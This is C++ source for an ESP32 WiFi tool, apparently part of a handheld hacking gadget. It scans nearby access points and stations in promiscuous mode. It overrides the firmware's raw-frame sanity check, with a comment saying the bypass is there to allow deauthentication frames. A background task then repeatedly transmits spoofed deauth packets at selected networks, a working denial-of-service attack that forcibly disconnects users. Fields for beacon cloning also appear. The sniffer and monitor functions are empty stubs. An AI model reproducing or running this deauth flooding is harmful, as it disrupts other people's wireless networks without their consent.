#include <TFT_eSPI.h>
#include "globals.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "wifiApp.h"
#include "Menu.h"
#include "display.h"
#include "controls.h"


extern controls ctr;
extern Menu* activem;
extern display dis;

wifi* wifi::instance = nullptr;
bool wifi::deauthing = false;


void wifi::init() {
  instance = this;
  WiFi.mode(WIFI_STA);
}



//------------------------------------------------------------------------
//          Scan Wifi Acesspoints by recieving beacon frames
//------------------------------------------------------------------------

void wifi::scanAps() {
  scanAp = true;
  firstApScan = true;
  apList.clear();
  WiFi.mode(WIFI_STA);
  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
  };
  esp_timer_create_args_t timerArgs = {
    .callback = &channelHopCallback,
    .arg = this,
    .name = "channel_hop"
  };
  ESP_ERROR_CHECK(esp_timer_create(&timerArgs, &channelHopperTimer));
  ESP_ERROR_CHECK(esp_timer_start_periodic(channelHopperTimer, 200000));
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&beaconCallbackAp);
  esp_wifi_set_promiscuous(true);
}
void wifi::beaconCallbackAp(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  auto* sniffer = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = sniffer->payload;
  if (frame[0] != 0x80) return;
  uint8_t channel = sniffer->rx_ctrl.channel;
  int rssi = sniffer->rx_ctrl.rssi;
  const uint8_t* bssid = &frame[10];
  uint8_t ssidLen = frame[37];
  String ssid = String((const char*)&frame[38], ssidLen);
  if (ssid.isEmpty()) return;
  String encryption = "Open";
  uint16_t capabilities = frame[34] | (frame[35] << 8);
  bool privacy = capabilities & (1 << 4);
  if (privacy) {
    encryption = "WEP/WPA";
    int pos = 38 + ssidLen;
    int frameLen = sniffer->rx_ctrl.sig_len;
    while (pos + 2 <= frameLen) {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos + 1];
      if (pos + 2 + len > frameLen) break;
      if (id == 0x30) {
        encryption = "WPA2/3";
        break;
      }
      if (id == 0xDD && len >= 4 &&
          frame[pos+2] == 0x00 && frame[pos+3] == 0x50 && frame[pos+4] == 0xF2) {
        encryption = "WPA";
        break;
      }
      pos += 2 + len;
    }
  }
  std::lock_guard<std::mutex> lock(instance->apMutex);
  bool exists = false;
  for (const auto& ap : instance->apList) {
    if (ap.ssid == ssid && memcmp(ap.bssid.data(), bssid, 6) == 0) {
      exists = true;
      break;
    }
  }
  if (!exists && ssid != "") {
    Serial.printf("%s (RSSI: %d dBm, ENC: %s)\n", ssid.c_str(), rssi, encryption.c_str());
    AccessPoint newAp;
    newAp.ssid = ssid;
    memcpy(newAp.bssid.data(), bssid, 6);
    newAp.channel = channel;
    newAp.rssi = rssi;
    newAp.encryption = encryption;
    newAp.isDeauthSelected = false;
    newAp.isBecCloneSelected = false;
    instance->apList.push_back(newAp);
    activem->setRenderState(true);
  }
}

//------------------------------------------------------------------------





//------------------------------------------------------------------------
//          Scan Wifi Stations by recieving beacon frames
//------------------------------------------------------------------------
void wifi::scanSts() {
  scanSt = true;
  firstApScan = true;
  stList.clear();
  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT
  };
  esp_timer_create_args_t timerArgs = {
    .callback = &channelHopCallback,
    .arg = this,
    .name = "channel_hop"
  };
  ESP_ERROR_CHECK(esp_timer_create(&timerArgs, &channelHopperTimer));
  ESP_ERROR_CHECK(esp_timer_start_periodic(channelHopperTimer, 200000));
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&beaconCallbackSt);
  esp_wifi_set_promiscuous(true);
}
void wifi::beaconCallbackSt(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!instance || !instance->scanSt) return;
  auto* sniffer = (wifi_promiscuous_pkt_t*)buf;
  const wifi_pkt_rx_ctrl_t* ctrl = &sniffer->rx_ctrl;
  const uint8_t* frame = sniffer->payload;
  Station newSt;
  newSt.channel = ctrl->channel;
  newSt.rssi = ctrl->rssi;
  if (type == WIFI_PKT_DATA) {
    memcpy(newSt.mac.data(), frame + 4, 6);
    memcpy(newSt.bssid.data(), frame + 16, 6);
  } else if (type == WIFI_PKT_MGMT && frame[0] == 0x40) {
    memcpy(newSt.mac.data(), frame + 10, 6);
    memset(newSt.bssid.data(), 0, 6);
  }
  newSt.isBecCloneSelected = false;
  std::lock_guard<std::mutex> lock(instance->stMutex);
  bool exists = false;
  for (const auto& st : instance->stList) {
    if (memcmp(st.mac.data(), newSt.mac.data(), 6) == 0) {
      exists = true;
      break;
    }
  }
  if (!exists) {
    instance->stList.push_back(newSt);
    activem->setRenderState(true);
  }
}
//------------------------------------------------------------------------



//------------------------------------------------------------------------
//                          stop any wifi scan
//------------------------------------------------------------------------
void wifi::stopWifiScan() {
  scanAp = false;
  scanSt = false;
  esp_timer_stop(channelHopperTimer);
  esp_timer_delete(channelHopperTimer);
  esp_wifi_set_promiscuous(false);
}
//------------------------------------------------------------------------





//------------------------------------------------------------------------
//                Scan packet trafic thanks to @SpaceHuhn
//------------------------------------------------------------------------

void wifi::packetSniffer(uint8_t* buf, uint16_t len) {
}
double wifi::getMultiplicator(long maxRow, long LineVal) {
  maxVal = 1;
  for (int i = 0; i < maxRow; i++) {
    if (val[i] > maxVal) maxVal = val[i];
  }
  if (maxVal > LineVal) return (double)LineVal / (double)maxVal;
  return 1;
}
void wifi::packetMonitor() {
}

//------------------------------------------------------------------------







//------------------------------------------------------------------------
//                      packets production section
//
//
//
//  bypass for sanity check
//  makes sending deauthentification frames possible

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

//------------------------------------------------------------------------

void wifi::startDeauth() {
  if (backgroundTask == NULL) {
    deauthing = true;
    xTaskCreatePinnedToCore(
      deauth,
      "DeauthTask",
      4096,
      NULL,
      1,
      &backgroundTask,
      1
    );
  }
}

void wifi::stopDeauth(){
  deauthing = false;
}


void wifi::deauth(void* param){
  while (deauthing){
    for(auto& ap : instance->apList){
      if(ap.isDeauthSelected){
        Serial.println("deauthing: " + ap.ssid);
        esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, instance->createDeauthPacket(ap.bssid.data()), sizeof(deauthPacket), false);
      }
    }
    vTaskDelay(100 / portTICK_PERIOD_MS);
  }
  backgroundTask = NULL;
  vTaskDelete(NULL);
}

bool wifi::isDeauthing(){
  return deauthing;
}

//------------------------------------------------------------------------

uint8_t* wifi::createDeauthPacket(uint8_t* bssid) {
  uint8_t* endPacket = deauthPacket;
  for (int i = 0; i < 6; i++) {
    endPacket[10 + i] = endPacket[16 + i] = bssid[i];
  }
  return endPacket;
}

//------------------------------------------------------------------------




void wifi::setApSelectings(int id, int mode, bool state){
  if(mode == 0){
    apList[id].isDeauthSelected = state;
  }
  if(mode == 1){
    apList[id].isBecCloneSelected = state;
  }
}

std::vector<AccessPoint> wifi::getApList() {
  return apList;
}
std::vector<Station> wifi::getStList() {
  return stList;
}
int wifi::getApDeauthSelects(){
  int aps = 0;
  for(auto ap : apList){
    if(ap.isDeauthSelected)aps++;
  }
  return aps;
}
int wifi::getStDeauthSelects(){
  int sts = 0;
  for(auto st : stList){
    if(st.isDeauthSelected)sts++;
  }
  return sts;
}
  
void wifi::setScanStatus(int i, bool status) {
  if (i == 0) {
    scanAp = false;
  } else if (i == 1) {
    scanSt = false;
  }
}
std::vector<bool> wifi::getFirstScan() {
  std::vector<bool> scanns = { firstApScan, firstStScan };
  return scanns;
}